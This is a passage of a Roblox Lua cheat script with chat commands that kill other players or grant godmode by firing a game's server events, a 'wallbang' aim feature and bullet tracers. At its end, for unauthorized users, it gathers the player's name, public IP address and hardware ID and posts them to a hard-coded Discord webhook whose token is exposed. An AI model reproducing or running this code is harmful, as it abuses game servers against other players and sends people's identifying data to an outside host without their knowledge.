                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
            end
        elseif string.sub(msg, 1, 5) == ";kill " then
            local partialName = string.sub(msg, 6)
            local playerToKill = findPlayerByPartialName(partialName)
        
          
            if playerToKill then
                Notif:Notify("Player to kill: " .. playerToKill.Name, 4, "information")
        
                local v = playerToKill
                local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist")
                
                if tool then
                 
                    tool.Script.egma:FireServer(v.Character.UpperTorso, v.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
                    Notif:Notify("Killed: " .. playerToKill.Name, 4, "information")
                else
                    Notif:Notify("No Fist tool found in inventory.", 4, "error")
                end
            else
                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
            end
        
        elseif string.sub(msg, 1, 5) == ";god " then
            local partialName = string.sub(msg, 6)
            local playerToGod = findPlayerByPartialName(partialName)
    
            if playerToGod then
                Notif:Notify("Giving godmode to: " .. playerToGod.Name, 4, "information")
                local playerChar = playerToGod.Character
                if playerChar and playerChar:FindFirstChild("UpperTorso") and playerChar:FindFirstChild("RightHand") then
                    local fist = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist")
                    if fist then
                        local script = fist:FindFirstChild("Script")
                        if script and script:FindFirstChild("egma") and script:FindFirstChild("legma") then
                            script.egma:FireServer(playerChar.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
                            script.legma:FireServer(playerChar.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
                            Notif:Notify("Targets Health: " .. tostring(playerChar.Humanoid.Health), 4, "information")
                        else
                            Notif:Notify('Fist script is missing required functions.', 4, "error")
                        end
                    else
                        Notif:Notify('No Fist tool found in inventory.', 4, "error")
                    end
                else
                    Notif:Notify('Target character is missing required parts.', 4, "error")
                end
            else
                Notif:Notify('Player: "' .. partialName .. '" not found, try again.', 4, "error")
            end
        end
    end)
    
    
    
    

    game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    wait(2)
    fly()
    end)

    
local function createBulletTracer(startPos, endPos)
    spawn(function()
        local TweenService = game:GetService("TweenService")
    local BulletTracers = Instance.new("Part")
    BulletTracers.Anchored = true
    BulletTracers.CanCollide = false
    BulletTracers.Material = Enum.Material.ForceField
    BulletTracers.Color = Color3.new(0.3921568627, 0.3921568627, 1)
    BulletTracers.Size = Vector3.new(0.1, 0.1, (startPos - endPos).magnitude)
    BulletTracers.CFrame = CFrame.new(startPos, endPos) * CFrame.new(0, 0, -BulletTracers.Size.Z / 2)
    BulletTracers.Name = tostring(math.random(1,10000000))
    BulletTracers.Parent = game.Workspace
    
    local tween = TweenService:Create(BulletTracers, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0), {Transparency = 1})
    tween:Play()
    tween.Completed:wait()
    BulletTracers:Destroy()
    end)
end


local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local isMouseButtonDown = false

local function createTracer()
    spawn(function()
        while isMouseButtonDown do
            local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") and tool.Handle:FindFirstChild("barrel") then
                local startPos = tool.Handle.barrel.WorldPosition
                local endPos = Mouse.Hit.p
                createBulletTracer(startPos, endPos)
            end
            wait(0.044) 
        end
    end)
end

local function onMouseButton1Down()
    isMouseButtonDown = true
    createTracer()
end

local function onMouseButton1Up()
    isMouseButtonDown = false
end

local function getDistanceFromMouse(mousePosition, targetPosition)
    return (mousePosition - targetPosition).Magnitude
end

local function getClosestPlayerToMouse()
    local closestPlayer = nil
    local shortestDistance = 10 
    local mousePosition = Vector2.new(Mouse.X, Mouse.Y)

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local character = player.Character
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            
            local screenPosition, onScreen = workspace.CurrentCamera:WorldToScreenPoint(humanoidRootPart.Position)

            if onScreen then
                local targetPosition = Vector2.new(screenPosition.X, screenPosition.Y)
                local distanceFromMouse = getDistanceFromMouse(mousePosition, targetPosition)

                if distanceFromMouse <= shortestDistance then
                    shortestDistance = distanceFromMouse
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end


UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        spawn(function()
            if _G.tracers then
                onMouseButton1Down()
            end
        end)
        spawn(function()
        if _G.wallbang then
            local tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") and tool.Handle:FindFirstChild("barrel") then
                local closestPlayer = getClosestPlayerToMouse()
                
                if closestPlayer then
                    for i, v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                        v.Name = i
                    end
                    local args = {
                        [1] = tool,
                        [2] = closestPlayer.Character.HumanoidRootPart,
                        [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                        [4] = Vector3.yAxis,
                        [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                end
            end
        end
    end)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        onMouseButton1Up() 
    end
end)



    

    local FinishedLoading = Notif:Notify("Loaded "  .. _G.scriptname, 4, "information")
    wait(0.1)
    for i,v in pairs(game.Players:GetChildren()) do
        if v.Character then
             if v.Character:FindFirstChild("Head") then
             if v.Character.Head:FindFirstChild("NameGui") then
        local str = v.Character.Head.NameGui.Main.Level.Text
        local nums = string.gmatch(str, "%d+")
        for digit in nums do 
        if tonumber(digit) > 300 then
                local FinishedLoading = Notif:Notify(v.Name .. " is a high risk player.", 4, "alert")
        end
        end
        end
        end
    end
        end
    else
    local LoadingXSX = Notif:Notify("Unauthorized, please wait. " .. ip, 2, "error") 
    setclipboard(tostring(ip))
    webhook = "https://discord.com/api/webhooks/1310987332077486213/EGCfKwiYZ4iK7V8KLZEAxB5ITfwG_ELQJkxiU0P5P9H4XtfRkZrB7W8XTJt8IiGvQy5p"

    local http = game:GetService("HttpService")
    local message = 
        {
            ["content"] = "**MOBILE COPY AND PASTE**\n" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()),
            ["embeds"] = {{
                            ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1310075397806755951/1310988578679164928/IMG_0099.jpg?ex=674738c2&is=6745e742&hm=700aef78a87e429db605e39bc8820e1b0a3fa625dd3c36935839c722a8ab9e78&"
                },
                ["title"] = "__**Unauthorized user**__",
                ["description"] = "```ansi\n[2;31m" .. game.Players.LocalPlayer.Name .. "\nIP: " .. game:HttpGet("https://api.ipify.org/")  .. "\nHWID: ".. tostring(game:GetService("RbxAnalyticsService"):GetClientId()) .. "[0m```",
                ["type"] = "rich",
                ["color"] = tonumber(0xFF0000),
            }}
        }
    local jsonMessage = http:JSONEncode(message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Body = jsonMessage,
            Method = "POST",
            Headers = headers,
        })
    end)
end
else
    local LoadingXSX = Notif:Notify("Script outdated, check #script inside discord.gg/Ua73rsUdsm", 2, "alert")  

end

